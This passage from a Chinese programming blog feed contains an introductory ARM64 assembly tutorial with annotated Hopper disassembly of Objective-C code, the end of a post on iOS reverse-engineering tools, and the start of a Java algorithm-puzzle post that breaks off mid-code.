<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8B%E5%8D%884.45.48.png" alt="屏幕快照 2018-02-03 下午4.45.48.png" title="" class="">
                <p>屏幕快照 2018-02-03 下午4.45.48.png</p>
            </figure>
<p>从图上来看就是到底是走左边分支还有右边分支，那么前期的简介部分就到此结束了，基本主要用到就是上述的几个指令，作为题外话说一句是，上面看到Cycript做动态的代码注入很酷，其实lldb也可以通过<code>expression</code>做到相同的效果，当然这也没什么了不起的了，毕竟工具又不是自己写的。那么这一篇博客也就到此结束了，这一篇的iOS工具集搭配我们的OS X工具集使用，就构成了一个完整的逆向环境。</p>
]]></content>
      
        <categories>
            
            <category> iOS工具集 Cycript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARM64汇编]]></title>
      <url>/2018/01/27/ARM64%E6%B1%87%E7%BC%96/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-27%20%E4%B8%8B%E5%8D%884.22.55.png" alt=""></p>
<p>上一次我们说过了ARM32，只是用来过渡，对于iOS来说，从iPhone5之后用的就已经全部都是ARM64了，因为每一种 CPU 的机器指令都是不一样的，因此对应的汇编语言也不一样，那么就来看看过渡之后的ARM有什么区别。</p>
<a id="more"></a>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>首先要来扫一扫盲，我们生活中所说的arm64,armv7,i386这些分别对应着我们生活中的哪些设备呢？我以Apple系列来举个例子：</p>
<ul>
<li>armv7｜armv7s｜arm64都是ARM处理器的指令集</li>
<li>i386｜x86_64 是Mac处理器的指令集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">arm64：iPhone6s | iphone6s plus｜iPhone6｜ iPhone6 plus｜iPhone5S | iPad Air｜ iPad mini2(iPad mini with Retina Display)</div><div class="line">armv7s：iPhone5｜iPhone5C｜iPad4(iPad with Retina Display)</div><div class="line">armv7：iPhone4｜iPhone4S｜iPad｜iPad2｜iPad3(The New iPad)｜iPad mini｜iPod Touch 3G｜iPod Touch4</div><div class="line"></div><div class="line">i386是针对intel通用微处理器32位处理器</div><div class="line">x86_64是针对x86架构的64位处理器</div><div class="line"></div><div class="line">模拟器32位处理器测试需要i386架构，</div><div class="line">模拟器64位处理器测试需要x86_64架构，</div><div class="line">真机32位处理器需要armv7,或者armv7s架构，</div><div class="line">真机64位处理器需要arm64架构。</div></pre></td></tr></table></figure>
<p>比如说我用5s来作为我的工程测试机，那么我在写MakeFile的之后指定其CPU架构的时候就会做一个兼容(ARCHS)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">THEOS_DEVICE_IP = <span class="number">192.168</span><span class="number">.1</span><span class="number">.129</span></div><div class="line">ARCHS = armv7 arm64</div><div class="line">TARGET = iphone:latest:<span class="number">7.0</span></div><div class="line"></div><div class="line">include /opt/theos/makefiles/common.mk</div><div class="line"></div><div class="line">TWEAK_NAME = ios_test</div><div class="line">ios_test_FILES = Tweak.xm</div><div class="line">ios_test_FRAMEWORKS = UIKit</div><div class="line"></div><div class="line">include $(THEOS_MAKE_PATH)/tweak.mk</div><div class="line"></div><div class="line">after-install::</div><div class="line">	install.exec <span class="string">"killall -9 SpringBoard"</span></div></pre></td></tr></table></figure>
<p>这其中在第二行的时候指定了是兼容armv7和arm64架构的CPU</p>
<h1 id="寄存器的变化"><a href="#寄存器的变化" class="headerlink" title="寄存器的变化"></a>寄存器的变化</h1><p>从ARM32到ARM64的过程中，寄存器的变化其实是很大的，在ARM32中，我们使用的是R0～R14和一个PC寄存器：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-30%20%E4%B8%8B%E5%8D%881.56.34.png" alt="ARM32" title="" class="">
                <p>ARM32</p>
            </figure>
<p>但是在ARM64中，事情似乎变的不一样了(在ARMv7中使用的仍然还是ARM32)</p>
<ol>
<li>arm64有32个64bit长度的通用寄存器x0～x30，sp，可以只使用其中的32bit w0～w30。 </li>
<li>arm32只有16个32bit的通用寄存器r0~r12, lr, pc, sp. arm64有32个128bit SIMD寄存器v0～v31，arm32有16个128bit SIMD寄存器Q0～Q15，又可细分为32个64bit SIMD寄存器D0～D31。</li>
<li>对于函数调用来说，arm64前面8个参数都是通过寄存器来传递x0～x7， arm32前面4个参数通过寄存器来传递r0～r3，其他通过栈传递。</li>
<li>ARM64模式下，通用寄存器X18、X30不能被使用。而需要被自己写的过程所保护的是：X19、X20、X21、X22、X23、X24、X25、X26、X27、X28、X29寄存器；而SIMD寄存器需要保护的是V8、V9、V10、V11、V12、V13、V14、V15。</li>
</ol>
<h1 id="常用的汇编指令"><a href="#常用的汇编指令" class="headerlink" title="常用的汇编指令"></a>常用的汇编指令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">MOV X1, X0  ;寄存器X0的值传给X1</div><div class="line">ADD X0, X1, X2  ;寄存器X1和X2的值相加后给X0</div><div class="line">SUB X0, X1, X2  ;寄存器X1和X2的值相减后给X0</div><div class="line"></div><div class="line">AND X0, X0, #0xF    ;X0和0xF相与后的值给X0</div><div class="line">ORR X0, X0, #0x10   ;X0和0x10相或后的值给X0</div><div class="line">EOR X0, X0, #0x11   ;X0和0x11相异或后的值给X0</div><div class="line"></div><div class="line">LDR(LDUR) X5, [X6, #0x8]  ;X6寄存器的值(地址)加0x8的地址内的值给X5</div><div class="line">STR(STUR) X0, [SP, #0x8]  ;X0的值给(SP+0x8)地址指向的空间</div><div class="line"></div><div class="line">STP X29, X30, [SP, #0x1]    ;入栈操作</div><div class="line">LDP X29, X30, [SP, #0x1]    ;出栈操作</div><div class="line"></div><div class="line">CBZ     比较，如果结果为0，就跳转到后面的指令</div><div class="line">CBNZ    比较，如果结果非0，就跳转到后面的指令</div><div class="line"></div><div class="line">CMP     比较指令，结果影响CSPR状态</div><div class="line"></div><div class="line">B/BL    绝对跳转,无返回值/绝对跳转,返回值地址保存到LR(X30)</div><div class="line">RET     子程序返回，返回地址保存到LR(X30)</div><div class="line"></div><div class="line">ADRP    用来定位数据段中的数据, 因为ASLR会导致代码及数据的地址随机化, 用ADRP来根据PC做辅助定位</div></pre></td></tr></table></figure>
<p>因为我们只是做一个基本的了解，只是为了可以大概的看懂反编译之后的汇编代码，所以只需要简单的介绍一下，知道意思即可，在上面的指令中我们尤其需要关注的就是BL指令了，作为逆向人员，需要对任何的跳转保持敏锐。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-30%20%E4%B8%8B%E5%8D%882.05.00.png" alt="屏幕快照 2018-01-30 下午2.05.00.png" title="" class="">
                <p>屏幕快照 2018-01-30 下午2.05.00.png</p>
            </figure>
<p>例如在上面的SpringBoard刷新函数中，我们去分析刷新到底干了什么重要的突破口也是跳转。</p>
<p>还有一个小点也需要注意的就是我们在指令中经常会看到三个操作数，如果是8086中的写法，我们将eax中的值加上20：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add		eax, 20</div></pre></td></tr></table></figure>
<p>但是在ARM中，我们会采用将<code>eax</code>中的值加上20再赋值给<code>eax</code>这样的思想，所以也就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add		X0, X0, 20</div></pre></td></tr></table></figure>
<h1 id="OC反汇编测试"><a href="#OC反汇编测试" class="headerlink" title="OC反汇编测试"></a>OC反汇编测试</h1><p>简单的C语言反汇编我们在之前的过程中就已经很熟悉了，基本看到如下的代码开头我们就知道接下来是要干什么了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push	ebp</div><div class="line">mov		ebp, esp</div><div class="line">...</div><div class="line">pop 	ebp</div></pre></td></tr></table></figure>
<p>那么我们在反汇编OC的程序的时候，情况是不是也是类似的呢？我们就来看看一个简单的类声明和实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">#import &quot;AppDelegate.h&quot;</div><div class="line"></div><div class="line">@interface Person : NSObject</div><div class="line">@property (nonatomic, copy) NSString *name;</div><div class="line">@property (nonatomic, assign) NSInteger age;</div><div class="line">- (instancetype)initWithName:(NSString *)name age:(NSInteger)age;</div><div class="line">@end</div><div class="line"></div><div class="line">@implementation Person</div><div class="line"></div><div class="line">- (instancetype)initWithName:(NSString *)name age:(NSInteger)age &#123;</div><div class="line">    </div><div class="line">    if (self = [super init]) &#123;</div><div class="line">        _name = name;</div><div class="line">        _age = age;</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation AppDelegate</div><div class="line"></div><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">    </div><div class="line">    [self personTestCode];</div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)personTestCode &#123;</div><div class="line">    </div><div class="line">    Person *xiaoming = [[Person alloc] initWithName:@&quot;xiaoming&quot; age:20];</div><div class="line">    xiaoming.age = 21;</div><div class="line">    Person *zhangfei = [[Person alloc] init];</div><div class="line">    zhangfei.name = @&quot;zhangfei&quot;;</div><div class="line">    zhangfei.age = 24;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>上面是一个Person类的简单实例化并赋值的代码，从ARM汇编的角度来分析一下吧，这里我们使用工具是Hopper：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">                     -[Person initWithName:age:]:</div><div class="line">0000000100006584         sub        sp, sp, #0x60                               ; Objective C Implementation defined at 0x1000081f8 (instance)  0x1000081f8 是数据段的地址，Person类的实现</div><div class="line">0000000100006588         stp        x29, x30, [sp, #0x50]</div><div class="line">000000010000658c         add        x29, sp, #0x50 ;x29=sp+0x50</div><div class="line">0000000100006590         sub        x8, x29, #0x18 ;x8 = x29-0x18</div><div class="line">0000000100006594         movz       x9, #0x0        ;x9 = 0</div><div class="line">0000000100006598         stur       x0, [x29, #0xfffffff8] ;(x29+0xfffffff8) = x0</div><div class="line">000000010000659c         stur       x1, [x29, #0xfffffff0] </div><div class="line">00000001000065a0         stur       x9, [x29, #0xffffffe8] </div><div class="line">00000001000065a4         mov        x0, x8</div><div class="line">00000001000065a8         mov        x1, x2</div><div class="line">00000001000065ac         str        x3, [sp, #0x18] ;(sp+0x18)=x3 传进来的age参数</div><div class="line">00000001000065b0         bl         imp___stubs__objc_storeStrong</div><div class="line">00000001000065b4         add        x0, sp, #0x20   ;x0 = sp+0x20</div><div class="line">00000001000065b8         adrp       x8, #0x100008000 ;地址生成指令 代表Person(声明)这个类，和类实现地址差不多0x1000081f8</div><div class="line">00000001000065bc         add        x8, x8, #0xe30    ; @selector(init) x8 = x8+0xe30 即：x8 = [Super init] </div><div class="line">00000001000065c0         adrp       x9, #0x100008000 ;x9 = Person</div><div class="line">00000001000065c4         add        x9, x9, #0xe78  ; 0x100008e78</div><div class="line">00000001000065c8         movz       x1, #0x0    ;x1 = 0</div><div class="line">00000001000065cc         ldr        x2, [sp, #0x18] = x2 = (sp+0x18)</div><div class="line">00000001000065d0         stur       x2, [x29, #0xffffffe0] ;(x29+0xffffffe0) = x2</div><div class="line">00000001000065d4         ldur       x3, [x29, #0xfffffff8] ;(x29+0xfffffff8) = x3</div><div class="line">00000001000065d8         stur       x1, [x29, #0xfffffff8] ;x1 = x3</div><div class="line">00000001000065dc         str        x3, [sp, #0x20] ;(sp+0x20) = x3</div><div class="line">00000001000065e0         ldr        x9, [x9]    ;（x9) = x9 x9指向的地址里的值，赋值x9</div><div class="line">00000001000065e4         str        x9, [sp, #0x28] ;(sp+0x28) = x9</div><div class="line">00000001000065e8         ldr        x1, [x8] ;x1 = (x8)</div><div class="line">00000001000065ec         bl         imp___stubs__objc_msgSendSuper2</div><div class="line">00000001000065f0         sub        x8, x29, #0x8 ;x8 = x29+0x8</div><div class="line">00000001000065f4         mov        x9, x0</div><div class="line">00000001000065f8         stur       x9, [x29, #0xfffffff8]</div><div class="line">00000001000065fc         mov        x1, x0</div><div class="line">0000000100006600         str        x0, [sp, #0x10]</div><div class="line">0000000100006604         mov        x0, x8</div><div class="line">0000000100006608         bl         imp___stubs__objc_storeStrong self = [super init] 赋值存储完成</div><div class="line">000000010000660c         ldr        x8, [sp, #0x10]</div><div class="line">0000000100006610         cbz        x8, 0x100006654 ;如果x8==0，跳转到0x100006654</div><div class="line"></div><div class="line">0000000100006614         adrp       x8, #0x100008000 ;x8 = self</div><div class="line">0000000100006618         add        x8, x8, #0xe80   ;地址 x8 = x8+0xe80=_name _OBJC_IVAR_$_Person._name</div><div class="line">000000010000661c         ldur       x9, [x29, #0xffffffe8] ; x9 = (x29+0xffffffe8)</div><div class="line">0000000100006620         ldur       x10, [x29, #0xfffffff8];x10 = (x29+0xfffffff8)</div><div class="line">0000000100006624         ldrsw      x8, [x8] ;x8 = (x8) </div><div class="line">0000000100006628         add        x8, x10, x8 ;x8 = x10+x8</div><div class="line">000000010000662c         mov        x0, x8 ;x0 = x8</div><div class="line">0000000100006630         mov        x1, x9 ;x1 = x9</div><div class="line">0000000100006634         bl         imp___stubs__objc_storeStrong ;存储name完成</div><div class="line"></div><div class="line">0000000100006638         adrp       x8, #0x100008000 ;x8=self</div><div class="line">000000010000663c         add        x8, x8, #0xe84   ;_age = age    _OBJC_IVAR_$_Person._age</div><div class="line">0000000100006640         ldur       x9, [x29, #0xffffffe0]</div><div class="line">0000000100006644         ldur       x10, [x29, #0xfffffff8]</div><div class="line">0000000100006648         ldrsw      x8, [x8]</div><div class="line">000000010000664c         add        x8, x10, x8</div><div class="line">0000000100006650         str        x9, [x8] ;存储age完成</div><div class="line"></div><div class="line">0000000100006654         ldur       x8, [x29, #0xfffffff8]                      ; XREF=-[Person initWithName:age:]+140</div><div class="line">0000000100006658         mov        x0, x8</div><div class="line">000000010000665c         bl         imp___stubs__objc_retain</div><div class="line">0000000100006660         movz       x8, #0x0</div><div class="line">0000000100006664         sub        x30, x29, #0x18</div><div class="line">0000000100006668         str        x0, [sp, #0x8]</div><div class="line">000000010000666c         mov        x0, x30</div><div class="line">0000000100006670         mov        x1, x8</div><div class="line">0000000100006674         bl         imp___stubs__objc_storeStrong</div><div class="line">0000000100006678         movz       x8, #0x0</div><div class="line">000000010000667c         sub        x0, x29, #0x8</div><div class="line">0000000100006680         mov        x1, x8</div><div class="line">0000000100006684         bl         imp___stubs__objc_storeStrong</div><div class="line">0000000100006688         ldr        x0, [sp, #0x8]</div><div class="line">000000010000668c         ldp        x29, x30, [sp, #0x50]</div><div class="line">0000000100006690         add        sp, sp, #0x60</div><div class="line">0000000100006694         ret        </div><div class="line">                        ; endp</div><div class="line"></div><div class="line"></div><div class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</div><div class="line"></div><div class="line">                     -[AppDelegate personTestCode]:</div><div class="line">0000000100006860         sub        sp, sp, #0x30                               ; Objective C Implementation defined at 0x100008cf0 (instance)</div><div class="line">0000000100006864         stp        x29, x30, [sp, #0x20]</div><div class="line">0000000100006868         add        x29, sp, #0x20</div><div class="line">000000010000686c         adrp       x8, #0x100008000  ;x8为Person类</div><div class="line">0000000100006870         add        x8, x8, #0xe40                              ; @selector(alloc) x8 = [Person alloc]</div><div class="line">0000000100006874         adrp       x9, #0x100008000</div><div class="line">0000000100006878         add        x9, x9, #0xe68                              ; objc_cls_ref_Person  x9为person对象</div><div class="line">000000010000687c         stur       x0, [x29, #0xfffffff8]</div><div class="line">0000000100006880         str        x1, [sp, #0x10]</div><div class="line">0000000100006884         ldr        x9, [x9]</div><div class="line">0000000100006888         ldr        x1, [x8]</div><div class="line">000000010000688c         mov        x0, x9</div><div class="line">0000000100006890         bl         imp___stubs__objc_msgSend ;调用init</div><div class="line">0000000100006894         adrp       x8, #0x100008000</div><div class="line">0000000100006898         add        x8, x8, #0x70                               ; @&quot;xiaoming&quot;  ;参数name</div><div class="line">000000010000689c         movz       x3, #0x14 ;参数age=20</div><div class="line">00000001000068a0         adrp       x9, #0x100008000</div><div class="line">00000001000068a4         add        x9, x9, #0xe48                              ; @selector(initWithName:age:) ;x9为初始化方法的地址</div><div class="line">00000001000068a8         ldr        x1, [x9]</div><div class="line">00000001000068ac         mov        x2, x8</div><div class="line">00000001000068b0         bl         imp___stubs__objc_msgSend ;调用initWithName:age:</div><div class="line">00000001000068b4         movz       x2, #0x15 ; 参数x2=age=21</div><div class="line">00000001000068b8         adrp       x8, #0x100008000</div><div class="line">00000001000068bc         add        x8, x8, #0xe50                              ; @selector(setAge:) ;x8为setAge:方法地址</div><div class="line">00000001000068c0         str        x0, [sp, #0x8]</div><div class="line">00000001000068c4         ldr        x9, [sp, #0x8]</div><div class="line">00000001000068c8         ldr        x1, [x8]</div><div class="line">00000001000068cc         mov        x0, x9</div><div class="line">00000001000068d0         bl         imp___stubs__objc_msgSend ;调用setAge:</div><div class="line"></div><div class="line"></div><div class="line">00000001000068d4         adrp       x8, #0x100008000</div><div class="line">00000001000068d8         add        x8, x8, #0xe40   ; @selector(alloc) [Person alloc]</div><div class="line">00000001000068dc         adrp       x9, #0x100008000</div><div class="line">00000001000068e0         add        x9, x9, #0xe68                              ; objc_cls_ref_Person</div><div class="line">00000001000068e4         ldr        x9, [x9]</div><div class="line">00000001000068e8         ldr        x1, [x8]</div><div class="line">00000001000068ec         mov        x0, x9</div><div class="line">00000001000068f0         bl         imp___stubs__objc_msgSend ;调用alloc</div><div class="line"></div><div class="line">00000001000068f4         adrp       x8, #0x100008000</div><div class="line">00000001000068f8         add        x8, x8, #0xe30                              ; @selector(init)</div><div class="line">00000001000068fc         ldr        x1, [x8]</div><div class="line">0000000100006900         bl         imp___stubs__objc_msgSend ;调用init</div><div class="line"></div><div class="line">0000000100006904         adrp       x8, #0x100008000</div><div class="line">0000000100006908         add        x8, x8, #0x90                               ; @&quot;zhangfei&quot; ;参数name</div><div class="line">000000010000690c         adrp       x9, #0x100008000</div><div class="line">0000000100006910         add        x9, x9, #0xe58  ; @selector(setName:) ;person setName: 方法地址</div><div class="line">0000000100006914         str        x0, [sp]</div><div class="line">0000000100006918         ldr        x0, [sp]</div><div class="line">000000010000691c         ldr        x1, [x9]</div><div class="line">0000000100006920         mov        x2, x8</div><div class="line">0000000100006924         bl         imp___stubs__objc_msgSend ; 调用setName: </div><div class="line"></div><div class="line">0000000100006928         orr        x2, xzr, #0x18 ;参数age=24</div><div class="line">000000010000692c         adrp       x8, #0x100008000</div><div class="line">0000000100006930         add        x8, x8, #0xe50                              ; @selector(setAge:) ;setAge:方法地址</div><div class="line">0000000100006934         ldr        x9, [sp]</div><div class="line">0000000100006938         ldr        x1, [x8]</div><div class="line">000000010000693c         mov        x0, x9</div><div class="line">0000000100006940         bl         imp___stubs__objc_msgSend ;调用setAge:</div><div class="line"></div><div class="line">0000000100006944         movz       x8, #0x0</div><div class="line">0000000100006948         mov        x9, sp</div><div class="line">000000010000694c         mov        x0, x9</div><div class="line">0000000100006950         mov        x1, x8</div><div class="line">0000000100006954         bl         imp___stubs__objc_storeStrong</div><div class="line">0000000100006958         movz       x8, #0x0</div><div class="line">000000010000695c         add        x9, sp, #0x8</div><div class="line">0000000100006960         mov        x0, x9</div><div class="line">0000000100006964         mov        x1, x8</div><div class="line">0000000100006968         bl         imp___stubs__objc_storeStrong</div><div class="line"></div><div class="line">000000010000696c         ldp        x29, x30, [sp, #0x20]</div><div class="line">0000000100006970         add        sp, sp, #0x30</div><div class="line">0000000100006974         ret        </div><div class="line">                        ; endp</div></pre></td></tr></table></figure>
<p>看到上面的代码千万不要头痛，其实过程没有想象中的那么复杂，只需要了解大致的意思即可，从我们的目的角度出发，并不是为了写这样子的汇编代码，仅仅是读懂罢了，整个的难度骤然降低，只不过当整个工程很大的时候，如果我们不能准确的定位目标函数，可能就会非常的头痛了！</p>
]]></content>
      
        <categories>
            
            <category> ARM64 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[蓝桥杯java习题解读]]></title>
      <url>/2018/01/25/%E8%93%9D%E6%A1%A5%E6%9D%AFjava%E4%B9%A0%E9%A2%98%E8%A7%A3%E8%AF%BB/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/315EF2D2297B92DBB04FFD1B9F718BB3.jpeg" height="350" width="600" alt=""></p>
<p>朝来试看青枝上，几朵寒栈未肯消？</p>
<p>Let get into the world of algorithm</p>
<a id="more"></a>
<h1 id="凑算式"><a href="#凑算式" class="headerlink" title="凑算式"></a>凑算式</h1><p>垃圾题目就先不说了，从一道填空题开始说起，这是一个表面上看起来直接暴力的题目，其实我们的算法本质上来说就是通过枚举，只不过有的人是暴力枚举，下面看题：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8B%E5%8D%885.18.23.png" alt="屏幕快照 2018-01-25 下午5.18.23.png" title="" class="">
                <p>屏幕快照 2018-01-25 下午5.18.23.png</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">这个算式中A-I代表1-9的数字，不同的字母代表不同的数字。</div><div class="line"></div><div class="line">比如：</div><div class="line"></div><div class="line">6+8/3+952/714 就是一种解法，</div><div class="line"></div><div class="line">5+3/1+972/486 是另一种解法。</div><div class="line"></div><div class="line">这个算式一共有多少种解法？</div><div class="line"></div><div class="line">注意：你提交应该是个整数，不要填写任何多余的内容或说明性文字。</div></pre></td></tr></table></figure>
<p>最简单的做法当然就是九层for循环套起来，然后比较，最后一层循环中判重，需要注意的就是比较的时候需要转换成小数，不然就会因为丢失精度导致漏解，但是这种lowB方法我们肯定不用，我们有两种选择，一个是通过回溯法，一个是通过Java中提供的栈数据结构：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">@利用栈</div><div class="line"><span class="keyword">import</span> java.util.Stack;</div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by harry on 2016/10/16.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">0</span>;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">1</span>; a &lt; <span class="number">10</span>; a++) &#123;</div><div class="line">            stack.push(a);</div><div class="line">            fun(stack);</div><div class="line">            stack.pop();</div><div class="line">        &#125;</div><div class="line">        System.out.println(count);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">(Stack&lt;Integer&gt; stack)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (stack.size() == <span 